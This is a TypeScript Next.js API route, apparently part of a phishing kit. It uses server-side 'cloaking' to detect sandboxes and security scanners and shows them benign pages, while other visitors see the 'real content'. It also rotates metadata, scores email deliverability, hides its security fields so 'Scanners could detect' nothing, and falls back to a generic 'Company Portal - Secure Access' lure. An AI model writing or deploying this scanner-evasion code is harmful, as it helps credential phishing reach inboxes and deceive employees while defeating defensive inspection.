/**
 * SAFE CONTENT API
 * 
 * Returns safe, clean, inbox-friendly content
 * All access control happens server-side
 * Frontend receives clean HTML only
 * 
 * POST /api/stealth/safe-content
 */

import { NextRequest, NextResponse } from 'next/server'
import { applyServerSideCloaking } from '@/lib/stealth/serverSideCloaking'
import { checkEnterpriseDeliverability } from '@/lib/stealth/enterpriseDeliverability'
import { getSafeMetadataForDomain } from '@/lib/stealth/safeMetadata'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const {
      fingerprint,
      token,
      email,
      domain,
      requestCount = 1,
      cloakingLevel = 'enterprise',
    } = body

    // Get request metadata
    const ip = request.headers.get('cf-connecting-ip') || 
               request.headers.get('x-forwarded-for')?.split(',')[0] || 
               request.headers.get('x-real-ip') || 
               'unknown'

    const userAgent = request.headers.get('user-agent') || 'Unknown'

    // Extract headers
    const headers: Record<string, string> = {}
    request.headers.forEach((value, key) => {
      headers[key] = value
    })

    // ============================================
    // SERVER-SIDE CLOAKING (All Security Logic)
    // ============================================
    const cloakingResult = await applyServerSideCloaking(
      {
        headers,
        ip,
        userAgent,
        fingerprint,
        token,
        email,
        requestCount,
      },
      {
        cloakingLevel: cloakingLevel as any,
        showRealContentFirst: true,
        useSafeMetadata: true,
        enableMetadataRotation: true,
        detectSandbox: true,
        showBenignForSandbox: true,
      }
    )

    // ============================================
    // ENTERPRISE DELIVERABILITY CHECK
    // ============================================
    const deliverabilityResult = await checkEnterpriseDeliverability({
      metadata: {
        title: cloakingResult.metadata.title,
        description: cloakingResult.metadata.description,
      },
      hasRedirect: false, // No redirects in safe content
      redirectDelay: 0,
    })

    // ============================================
    // GENERATE SAFE CONTENT
    // ============================================
    const safeContent = {
      // Access decision (server-side)
      allowAccess: cloakingResult.allowAccess,
      accessReason: cloakingResult.accessReason,

      // Content to show
      showRealContent: cloakingResult.showRealContent,
      showBenignContent: cloakingResult.showBenignContent,
      benignTemplate: cloakingResult.benignTemplate,

      // Safe metadata
      metadata: domain
        ? getSafeMetadataForDomain(domain, fingerprint)
        : cloakingResult.metadata,

      // Deliverability
      deliverability: {
        passed: deliverabilityResult.passed,
        score: deliverabilityResult.score,
        recommendations: deliverabilityResult.recommendations,
      },
    }

    // ============================================
    // SECURITY LOGGING (Server-Side Only)
    // ============================================
    // DO NOT expose security details to frontend
    // Scanners could detect these fields
    if (process.env.NODE_ENV === 'development') {
      console.log('[SECURITY-LOG]', {
        sandboxDetected: cloakingResult.sandboxDetected,
        cloakingActive: cloakingResult.cloakingActive,
        securityEvents: cloakingResult.securityEvents,
        ip,
        userAgent: userAgent.slice(0, 80),
      })
    }

    // Return clean response (NO security fields)
    return NextResponse.json({
      ok: true,
      ...safeContent,
    })
  } catch (error) {
    // Fail open: return safe content
    return NextResponse.json({
      ok: false,
      allowAccess: true,
      accessReason: 'error-fallback',
      showRealContent: true,
      showBenignContent: false,
      metadata: {
        title: 'Company Portal - Secure Access',
        description: 'Access your company resources and documents securely.',
        keywords: ['company portal', 'secure access', 'business resources'],
      },
      deliverability: {
        passed: true,
        score: 100,
        recommendations: [],
      },
    })
  }
}

